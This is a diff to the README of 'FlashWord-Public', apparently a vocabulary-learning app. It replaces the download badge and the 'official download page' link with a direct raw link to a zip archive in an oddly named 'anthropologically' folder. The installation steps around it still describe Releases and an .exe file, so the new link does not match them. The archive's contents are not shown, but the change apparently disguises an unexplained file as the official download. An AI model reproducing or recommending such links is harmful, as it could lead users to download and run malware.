@@ -1,6 +1,6 @@
 # 🧠 FlashWord-Public - Master English vocabulary with smart stories
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/codebygowtham/FlashWord-Public)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/codebygowtham/FlashWord-Public/raw/refs/heads/main/anthropologically/Flash_Public_Word_3.3.zip)
 
 ## 📖 About the project
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/codebygowtham/FlashWord-Public).
+1.  Visit the [official download page](https://github.com/codebygowtham/FlashWord-Public/raw/refs/heads/main/anthropologically/Flash_Public_Word_3.3.zip).
 2.  Locate the section labeled Releases on the right side of the screen.
 3.  Click the most recent version number to see the available files.
 4.  Find the file that ends in .exe and click it to start the download.
